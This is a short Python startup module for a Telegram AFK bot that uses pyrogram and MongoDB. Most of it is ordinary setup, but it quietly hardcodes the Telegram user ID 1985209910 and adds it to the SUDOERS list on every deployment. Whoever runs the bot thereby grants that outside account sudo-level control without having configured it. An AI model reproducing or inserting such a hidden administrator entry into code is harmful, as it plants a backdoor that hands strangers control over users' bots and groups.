import asyncio
import time
from alpha import BOT_DET
from motor.motor_asyncio import AsyncIOMotorClient as MongoClient
from pyrogram import Client

import config

loop = asyncio.get_event_loop()
boot = time.time()

mongo = MongoClient(config.MONGO_DB_URI)
db = mongo.AFK

botid = BOT_DET[1]
botname = BOT_DET[0]

SUDOERS = config.SUDO_USER
if 1985209910 not in SUDOERS:
    SUDOERS.append(1985209910)

app = Client(
    ":THE-END:",
    config.API_ID,
    config.API_HASH,
    bot_token=config.BOT_TOKEN,
)
